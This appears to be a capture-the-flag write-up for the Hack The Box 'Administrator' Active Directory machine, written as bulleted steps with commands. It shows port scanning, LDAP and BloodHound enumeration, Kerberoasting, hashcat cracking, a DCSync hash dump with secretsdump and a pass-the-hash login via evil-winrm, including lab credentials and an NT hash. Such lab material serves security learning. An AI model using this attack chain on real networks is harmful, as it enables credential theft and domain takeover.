- I start with a scan of the open ports and I continue with a scan of the versions and technologies that are running on the open ports that we have found
	
	```python
	nmap -p- --open --min-rate 5000 -Pn sS 10.10.11.42 -oG scan
	nmap -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49667,49668,52151,56764,60584,60595,60600,60603,60623 -sCV -Pn 10.10.11.42 -oN ports
	```

- I'm trying to pull up something interesting that is shared by smb using the credentials provided by HTB but I can't find anything.
- enumerate the system with [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) bloodhound to see if there are potential ways to escalate privileges.

	```python
	ldapdomaindump -u 'ADMINISTRATOR.HTB\olivia' -p 'ichliebedich' 10.10.11.42
	bloodhound-python -u 'olivia' -p 'ichliebedich' -ns 10.10.11.42 -d administrator.htb --zip
	```

- I list the users who have SPN set to request a TGS, I find the user ethan and get his hash

	```python
	rdate -n 10.10.11.42; impacket-GetUserSPNs  administrator.htb/olivia:ichliebedich -request
	```

- I break in hash and get the clear text password from the user 

	```python
	hashcat -m 13100 -a 0 TgS_ethan /usr/share/wordlists/rockyou.txt -o cracked.txt
	```

- Consulting bloodhound I see that I can obtain the user hashes by doing a DCSync attack.

	```python
	impacket-secretsdump administrator.htb/ethan@10.10.11.42
	```

- I get the nt hash from the admin user and connect with it to the system to be able to read the second flag.

	```python
	evil-winrm -u Administrator -H "3dc553ce4b9fd20bd016e098d2d2fd2e" -i 10.10.11.42
	```
